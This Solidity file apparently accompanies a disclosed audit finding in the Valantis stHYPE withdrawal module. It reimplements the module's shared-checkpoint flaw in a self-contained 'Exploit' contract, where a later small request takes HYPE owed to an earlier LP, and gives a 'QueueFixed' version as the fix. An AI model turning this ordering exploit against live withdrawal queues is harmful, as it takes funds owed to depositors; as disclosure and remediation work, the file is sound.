// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Valantis stHYPEWithdrawalModule — Hexens VLTS3-9, 2025-03-17.
    burnToken0AfterWithdraw stores cumulativeAmountToken1ClaimableLPWithdrawal
    as the request checkpoint. That cursor moves only in update(), after HYPE
    arrives from the overseer. Two requests opened before that update share
    the same checkpoint. The later, smaller request becomes claimable as soon
    as the earlier fill is counted, and it spends HYPE the earlier LP needs.

    10 HYPE is already in the module (the redeemed burn) and update() has not
    run. First LP requests 10. Later LP requests 1. Both checkpoints are 0.
    update() sets the claimable cumulative to 10. The later LP's check is
    10 >= 0 + 1, so claim sends 1 HYPE. The first LP's check is 10 >= 0 + 10,
    but only 9 HYPE is left, so the full claim reverts.

    The control checkpoint is the cumulative amount requested. The first LP
    is claimable at 10 and the later LP at 11. After the same fill, the later
    claim reverts and the first LP receives 10.
*/

contract Exploit {
    address public constant FIRST = 0x3333333333333333333333333333333333333333;
    address public constant LATER = 0x2222222222222222222222222222222222222222;

    struct Request {
        address recipient;
        uint256 amount;
        uint256 checkpoint;
    }

    Request[2] public requests;
    uint256 public cumulativeClaimable;
    uint256 public claimable;
    uint256 public firstCheckpoint;
    uint256 public laterCheckpoint;
    uint256 public received;
    uint256 public laterNeed;
    uint256 public firstNeed;
    uint256 public paidToLater;
    bool public laterReady;
    bool public firstReady;
    bool public user1Claimed;

    function run() external {
        requests[0] = Request({recipient: FIRST, amount: 10 ether, checkpoint: cumulativeClaimable});
        firstCheckpoint = requests[0].checkpoint;
        requests[1] = Request({recipient: LATER, amount: 1 ether, checkpoint: cumulativeClaimable});
        laterCheckpoint = requests[1].checkpoint;
        uint256 bal = address(this).balance;
        received = bal - claimable;
        claimable = bal;
        cumulativeClaimable += received;
        laterNeed = requests[1].checkpoint + requests[1].amount;
        // @> VULN: shared claimable checkpoint lets the later 1 HYPE request clear on the earlier fill
        if (cumulativeClaimable < laterNeed) revert("cannotYetClaim");
        laterReady = true;
        require(claimable >= requests[1].amount, "later funds");
        claimable -= requests[1].amount;
        paidToLater = requests[1].amount;
        (bool sent,) = payable(requests[1].recipient).call{value: paidToLater}("");
        require(sent, "send");
        firstNeed = requests[0].checkpoint + requests[0].amount;
        if (cumulativeClaimable < firstNeed) revert("cannotYetClaim");
        firstReady = true;
        user1Claimed = claimable >= requests[0].amount;
        require(firstCheckpoint == 0 && laterCheckpoint == 0, "same cursor");
        require(received == 10 ether, "filled 10");
        require(laterReady, "later ready");
        require(paidToLater == 1 ether, "later paid");
        require(LATER.balance == 1 ether, "later balance");
        require(firstReady, "first time-ready");
        require(!user1Claimed, "first lacks 10");
        require(address(this).balance == 9 ether, "nine left");
        require(claimable == 9 ether, "claimable nine");
    }
}

contract QueueFixed {
    struct Request {
        address recipient;
        uint256 amount;
        uint256 checkpoint;
    }

    Request[2] public requests;
    uint256 public cumulativeWithdrawn;
    uint256 public cumulativeClaimable;
    uint256 public claimable;
    uint256 public nextId;
    uint256 public paidToFirst;

    function open(address to, uint256 amount) external {
        cumulativeWithdrawn += amount;
        requests[nextId] = Request({recipient: to, amount: amount, checkpoint: cumulativeWithdrawn});
        nextId++;
    }

    function update() external {
        uint256 bal = address(this).balance;
        uint256 received = bal - claimable;
        claimable = bal;
        cumulativeClaimable += received;
    }

    function claim(uint256 id) external {
        Request memory request = requests[id];
        require(cumulativeClaimable >= request.checkpoint, "cannotYetClaim");
        require(claimable >= request.amount, "insufficient");
        claimable -= request.amount;
        if (id == 0) paidToFirst = request.amount;
        (bool ok,) = payable(request.recipient).call{value: request.amount}("");
        require(ok, "send");
    }
}
